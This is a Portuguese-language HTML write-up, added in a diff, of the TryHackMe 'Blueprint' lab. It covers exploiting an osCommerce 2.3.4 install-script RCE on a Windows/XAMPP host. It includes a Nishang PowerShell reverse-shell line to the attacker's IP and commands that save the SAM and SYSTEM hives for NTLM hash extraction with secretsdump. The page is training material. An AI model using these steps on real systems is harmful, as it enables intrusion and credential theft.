@@ -1,0 +1,103 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+
+<head>
+   <meta charset="UTF-8">
+   <meta name="viewport" content="width=device-width, initial-scale=1.0">
+   <link href="https://fonts.googleapis.com/css2?family=Raleway:wght@400;700&display=swap" rel="stylesheet">
+   <link rel="stylesheet" href="../../../../assets/css/articles.css">
+   <link rel="icon" type="image/png" href="/img/home/favicon.png" />
+   <title>blueprint.</title>
+</head>
+
+<body>
+    <header class="header">
+        <nav class="breadcrumb">
+            <a href="/index.html">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                    stroke-linejoin="round">
+                    <path d="M19 12H5M12 19l-7-7 7-7" />
+                </svg>
+                Voltar
+            </a>
+        </nav>
+        <div class="header-controls">
+            <div class="language-toggle">
+                <a href="../../../pt-br/writeups/tryhackme/blueprint.html" class="active" title="Português (Brasil)">
+                    <svg viewBox="0 0 72 48" xmlns="http://www.w3.org/2000/svg">
+                        <rect width="72" height="48" fill="#009c3b" />
+                        <polygon points="36,4 68,24 36,44 4,24" fill="#ffdf00" />
+                        <circle cx="36" cy="24" r="12" fill="#002776" />
+                        <path d="M24.5,21 Q36,28 47.5,21" stroke="#fff" stroke-width="2.5" fill="none" />
+                        <circle cx="30" cy="28" r="0.6" fill="#fff" />
+                        <circle cx="33" cy="30" r="0.5" fill="#fff" />
+                        <circle cx="36" cy="31" r="0.6" fill="#fff" />
+                        <circle cx="39" cy="30" r="0.5" fill="#fff" />
+                        <circle cx="42" cy="28" r="0.6" fill="#fff" />
+                    </svg>
+                </a>
+                <a href="../../../en-us/writeups/tryhackme/blueprint.html" title="English (US)">
+                    <svg viewBox="0 0 36 24" xmlns="http://www.w3.org/2000/svg">
+                        <rect width="36" height="24" fill="#fff" />
+                        <rect width="36" height="1.85" y="0" fill="#b22234" />
+                        <rect width="36" height="1.85" y="3.7" fill="#b22234" />
+                        <rect width="36" height="1.85" y="7.4" fill="#b22234" />
+                        <rect width="36" height="1.85" y="11.1" fill="#b22234" />
+                        <rect width="36" height="1.85" y="14.8" fill="#b22234" />
+                        <rect width="36" height="1.85" y="18.5" fill="#b22234" />
+                        <rect width="36" height="1.85" y="22.2" fill="#b22234" />
+                        <rect width="14.4" height="12.95" fill="#3c3b6e" />
+                    </svg>
+                </a>
+            </div>
+        </div>
+    </header>
+   <main class="content">
+      <header class="article-header">
+         <h1>Blueprint</h1>
+         <p class="meta">
+            TryHackMe &middot; Easy by <a href="https://www.linkedin.com/in/brennocm/">Brenno M.</a>
+         </p>
+      </header>
+      <section class="article-body writeup-body">
+         <p>Blueprint explora uma <b>RCE</b> no osCommerce 2.3.4 (install script exposto) para obter execução de comandos como SYSTEM em um host Windows/XAMPP e, então, extrai os hashes locais com o <b>secretsdump</b>.</p>
+
+         <figure class="attack-flow">
+            <figcaption>Fluxo do ataque</figcaption>
+            <svg viewBox="0 0 660 130" role="img" aria-label="Fluxo do ataque" xmlns="http://www.w3.org/2000/svg"><line x1="24" y1="32.0" x2="24" y2="52.0" stroke="#5c7a12" stroke-width="2"/><line x1="24" y1="78.0" x2="24" y2="98.0" stroke="#5c7a12" stroke-width="2"/><circle cx="24" cy="19.0" r="13" fill="#16200a" stroke="#9fef00" stroke-width="2"/><text x="24" y="19.0" fill="#9fef00" font-size="12" font-weight="700" text-anchor="middle" dominant-baseline="central">1</text><text fill="#e4e4e4" font-size="15" font-weight="600" dominant-baseline="central"><tspan x="54" y="19.0">Reconhecimento</tspan></text><circle cx="24" cy="65.0" r="13" fill="#16200a" stroke="#9fef00" stroke-width="2"/><text x="24" y="65.0" fill="#9fef00" font-size="12" font-weight="700" text-anchor="middle" dominant-baseline="central">2</text><text fill="#e4e4e4" font-size="15" font-weight="600" dominant-baseline="central"><tspan x="54" y="65.0">Exploração</tspan></text><circle cx="24" cy="111.0" r="13" fill="#16200a" stroke="#9fef00" stroke-width="2"/><text x="24" y="111.0" fill="#9fef00" font-size="12" font-weight="700" text-anchor="middle" dominant-baseline="central">3</text><text fill="#e4e4e4" font-size="15" font-weight="600" dominant-baseline="central"><tspan x="54" y="111.0">Pós-exploração - secretsdump</tspan></text></svg>
+         </figure>
+
+         <h2>Reconhecimento</h2>
+
+         <p>O Nmap revela IIS, Apache/PHP (8080), SMB e MySQL. Em 8080 roda o <b>osCommerce 2.3.4</b>, com o exploit público 44374.</p>
+
+         <pre class="code-block"><code>nmap -sS -sV -Pn &lt;IP&gt;
+searchsploit osCommerce 2.3.4
+searchsploit -m 44374</code></pre>
+
+         <h2>Exploração</h2>
+
+         <p>O exploit injeta código no <i>install.php</i> e permite comandos via parâmetro. Hospeda-se uma reverse shell PowerShell (Nishang) e obtém-se shell, no XAMPP, já como privilegiado.</p>
+
+         <pre class="code-block"><code>python3 44374.py   # (base_url e target_url configurados)
+# Invoke-PowerShellTcp -Reverse -IPAddress &lt;MEU_IP&gt; -Port 4444</code></pre>
+
+         <h2>Pós-exploração - secretsdump</h2>
+
+         <p>Salvam-se as colmeias SAM e SYSTEM do registro, baixam-se e extraem-se os hashes NTLM localmente com o Impacket <b>secretsdump</b> (o hash pode então ser quebrado offline).</p>
+
+         <pre class="code-block"><code>reg save hklm\sam sam.bak
+reg save hklm\system system.bak
+# baixar sam.bak / system.bak
+impacket-secretsdump -sam sam.bak -system system.bak LOCAL
+# hash NTLM do Administrator: &lt;HASH_OMITIDO&gt;  (quebrar offline)</code></pre>
+      </section>
+   </main>
+   <br>
+   <footer>
+      <p>&copy; 20∞</p>
+   </footer>
+    <script src="../../../../assets/js/article-toc.js" defer></script>
+</body>
+
+</html>
